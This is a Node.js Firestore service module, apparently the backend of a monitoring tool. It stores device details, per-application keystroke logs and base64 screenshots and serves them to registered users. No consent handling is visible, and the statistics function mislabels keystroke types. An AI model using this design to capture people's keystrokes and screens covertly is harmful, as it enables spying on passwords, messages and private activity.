const { getFirestore, getAdmin } = require('../config/firebase');

// Device management
const deviceService = {
  // Add a new device
  async addDevice(deviceId, deviceData) {
    try {
      const db = getFirestore();
      await db.collection('devices').doc(deviceId).set({
        allIPAddresses: deviceData.allIPAddresses || [],
        architecture: deviceData.architecture || '',
        availableMemory: deviceData.availableMemory || '',
        computerName: deviceData.computerName || '',
        cpuCores: deviceData.cpuCores || '',
        cpuName: deviceData.cpuName || '',
        cpuSpeed: deviceData.cpuSpeed || '',
        firstSeen: deviceData.firstSeen || new Date().toISOString(),
        installedSoftware: deviceData.installedSoftware || [],
        lastUpdated: new Date().toISOString(),
        primaryIPAddress: deviceData.primaryIPAddress || '',
        primaryMacAddress: deviceData.primaryMacAddress || '',
        systemUptime: deviceData.systemUptime || '',
        totalMemory: deviceData.totalMemory || '',
        userName: deviceData.userName || '',
        windowsVersion: deviceData.windowsVersion || ''
      });
      
      return { success: true, deviceId };
    } catch (error) {
      console.error('Error adding device:', error);
      return { success: false, error: error.message };
    }
  },

  // Get devices for a user (from users/users/{email} array)
  async getUserDevices(userEmail) {
    try {
      const db = getFirestore();
      
      // Get user's device list from users/users document
      const userDocRef = db.collection('users').doc('users');
      const userDoc = await userDocRef.get();
      
      if (!userDoc.exists) {
        return { success: true, devices: [] };
      }
      
      const userData = userDoc.data();
      const deviceIds = userData[userEmail] || [];
      
      if (deviceIds.length === 0) {
        return { success: true, devices: [] };
      }
      
      // Fetch device details for each device ID
      const devices = [];
      for (const deviceId of deviceIds) {
        const deviceDoc = await db.collection('devices').doc(deviceId).get();
        if (deviceDoc.exists) {
          devices.push({
            id: deviceId,
            ...deviceDoc.data()
          });
        }
      }
      
      return { success: true, devices };
    } catch (error) {
      console.error('Error fetching user devices:', error);
      return { success: false, error: error.message, devices: [] };
    }
  },

  // Get a single device
  async getDevice(deviceId) {
    try {
      const db = getFirestore();
      const deviceDoc = await db.collection('devices').doc(deviceId).get();
      
      if (deviceDoc.exists) {
        return { 
          success: true, 
          device: { id: deviceId, ...deviceDoc.data() } 
        };
      } else {
        return { success: false, error: 'Device not found' };
      }
    } catch (error) {
      console.error('Error fetching device:', error);
      return { success: false, error: error.message };
    }
  },

  // Update device
  async updateDevice(deviceId, updates) {
    try {
      const db = getFirestore();
      await db.collection('devices').doc(deviceId).update({
        ...updates,
        lastUpdated: new Date().toISOString()
      });
      
      return { success: true };
    } catch (error) {
      console.error('Error updating device:', error);
      return { success: false, error: error.message };
    }
  },

  // Delete device
  async deleteDevice(deviceId) {
    try {
      const db = getFirestore();
      await db.collection('devices').doc(deviceId).delete();
      return { success: true };
    } catch (error) {
      console.error('Error deleting device:', error);
      return { success: false, error: error.message };
    }
  },

  // Update device last updated timestamp
  async updateLastActive(deviceId) {
    try {
      const db = getFirestore();
      await db.collection('devices').doc(deviceId).update({
        lastUpdated: new Date().toISOString()
      });
      
      return { success: true };
    } catch (error) {
      console.error('Error updating last active:', error);
      return { success: false, error: error.message };
    }
  }
};

// Keystroke sequence management
const sequenceService = {
  // Add keystroke data for a device and date with app context
  async addKeystroke(deviceId, date, appName, timestamp, text) {
    try {
      const db = getFirestore();
      const dateDocRef = db.collection('records').doc(deviceId).collection('keyStrokes').doc(date);
      
      // Get existing data or create new
      const dateDoc = await dateDocRef.get();
      let existingData = {};
      
      if (dateDoc.exists) {
        existingData = dateDoc.data();
      }
      
      // Initialize app object if it doesn't exist
      if (!existingData[appName]) {
        existingData[appName] = {};
      }
      
      // Add new keystroke with timestamp
      existingData[appName][timestamp] = text;
      
      await dateDocRef.set(existingData);
      
      return { success: true };
    } catch (error) {
      console.error('Error adding keystroke:', error);
      return { success: false, error: error.message };
    }
  },

  // Get keystrokes for a device on a specific date
  async getDeviceKeystrokes(deviceId, date) {
    try {
      const db = getFirestore();
      const dateDocRef = db.collection('records').doc(deviceId).collection('keyStrokes').doc(date);
      const dateDoc = await dateDocRef.get();
      
      if (!dateDoc.exists) {
        return { success: true, keystrokes: [] };
      }
      
      const keystrokeData = dateDoc.data();
      
      // Convert app-based data to flat keystroke array
      const keystrokes = [];
      
      Object.entries(keystrokeData).forEach(([appName, appKeystrokes]) => {
        if (typeof appKeystrokes === 'object' && appKeystrokes !== null) {
          Object.entries(appKeystrokes).forEach(([timestamp, text]) => {
            // Convert timestamp to milliseconds if it's in seconds
            const timestampMs = timestamp.length === 10 ? parseInt(timestamp) * 1000 : parseInt(timestamp);
            
            keystrokes.push({
              timestamp: new Date(timestampMs).toISOString(),
              keystroke: text,
              text: text,
              appName: appName,
              originalTimestamp: timestamp,
              key: text,
              type: 'text',
              length: text.length
            });
          });
        }
      });
      
      // Sort by timestamp
      keystrokes.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
      
      return { success: true, keystrokes };
    } catch (error) {
      console.error('Error fetching device keystrokes:', error);
      return { success: false, error: error.message, keystrokes: [] };
    }
  },

  // Get all dates with keystroke data for a device
  async getDeviceDates(deviceId) {
    try {
      const db = getFirestore();
      const keystrokesRef = db.collection('records').doc(deviceId).collection('keyStrokes');
      const querySnapshot = await keystrokesRef.get();
      
      const dates = [];
      querySnapshot.forEach((doc) => {
        dates.push(doc.id);
      });
      
      return { success: true, dates: dates.sort().reverse() }; // Most recent first
    } catch (error) {
      console.error('Error fetching device dates:', error);
      return { success: false, error: error.message, dates: [] };
    }
  },

  // Get keystroke statistics for a device and date
  async getDeviceStats(deviceId, date) {
    try {
      const result = await this.getDeviceKeystrokes(deviceId, date);
      
      if (!result.success || result.keystrokes.length === 0) {
        return {
          success: true,
          stats: {
            totalKeys: 0,
            startTime: null,
            endTime: null,
            hourlyDistribution: {},
            typeDistribution: { letter: 0, number: 0, special: 0 }
          }
        };
      }
      
      const keystrokes = result.keystrokes;
      
      // Calculate statistics
      const typeDistribution = { letter: 0, number: 0, special: 0 };
      const hourlyDistribution = {};
      
      keystrokes.forEach(keystroke => {
        typeDistribution[keystroke.type]++;
        
        const hour = new Date(keystroke.timestamp).getHours();
        hourlyDistribution[hour] = (hourlyDistribution[hour] || 0) + 1;
      });
      
      return {
        success: true,
        stats: {
          totalKeys: keystrokes.length,
          startTime: keystrokes[0].timestamp,
          endTime: keystrokes[keystrokes.length - 1].timestamp,
          hourlyDistribution,
          typeDistribution
        }
      };
    } catch (error) {
      console.error('Error calculating device stats:', error);
      return {
        success: false,
        error: error.message,
        stats: {
          totalKeys: 0,
          startTime: null,
          endTime: null,
          hourlyDistribution: {},
          typeDistribution: { letter: 0, number: 0, special: 0 }
        }
      };
    }
  }
};

// Screenshot management
const screenshotService = {
  // Get screenshots for a device on a specific date
  async getDeviceScreenshots(deviceId, date) {
    try {
      const db = getFirestore();
      const dateDocRef = db.collection('records').doc(deviceId).collection('screenshots').doc(date);
      const dateDoc = await dateDocRef.get();
      
      if (!dateDoc.exists) {
        return { success: true, screenshots: [] };
      }
      
      const screenshotData = dateDoc.data();
      
      // Convert map to array with timestamps
      const screenshots = [];
      Object.entries(screenshotData).forEach(([timestamp, base64Image]) => {
        // Convert timestamp to milliseconds if it's in seconds
        const timestampMs = timestamp.length === 10 ? parseInt(timestamp) * 1000 : parseInt(timestamp);
        
        screenshots.push({
          timestamp: new Date(timestampMs).toISOString(),
          originalTimestamp: timestamp,
          imageData: base64Image,
          id: timestamp
        });
      });
      
      // Sort by timestamp
      screenshots.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
      
      return { success: true, screenshots };
    } catch (error) {
      console.error('Error fetching device screenshots:', error);
      return { success: false, error: error.message, screenshots: [] };
    }
  },

  // Get all dates with screenshot data for a device
  async getScreenshotDates(deviceId) {
    try {
      const db = getFirestore();
      const screenshotsRef = db.collection('records').doc(deviceId).collection('screenshots');
      const querySnapshot = await screenshotsRef.get();
      
      const dates = [];
      querySnapshot.forEach((doc) => {
        dates.push(doc.id);
      });
      
      return { success: true, dates: dates.sort().reverse() }; // Most recent first
    } catch (error) {
      console.error('Error fetching screenshot dates:', error);
      return { success: false, error: error.message, dates: [] };
    }
  }
};

// User management
const userService = {
  // Register a new user
  async registerUser(email) {
    try {
      const db = getFirestore();
      const admin = getAdmin();
      const usersDocRef = db.collection('users').doc('users');
      
      // Check if the document exists, if not create it
      const usersDoc = await usersDocRef.get();
      if (!usersDoc.exists) {
        await usersDocRef.set({});
      }
      
      // Check if user email already exists
      const currentData = usersDoc.data() || {};
      if (currentData[email]) {
        return {
          success: false,
          error: 'User already exists'
        };
      }
      
      // Use FieldPath to safely handle email with dots as field name
      await usersDocRef.update(new admin.firestore.FieldPath(email), []);
      
      return {
        success: true,
        message: 'User created successfully',
        email: email
      };
    } catch (error) {
      console.error('Error creating user:', error);
      return {
        success: false,
        error: 'Failed to create user'
      };
    }
  }
};

module.exports = {
  deviceService,
  sequenceService,
  screenshotService,
  userService
};
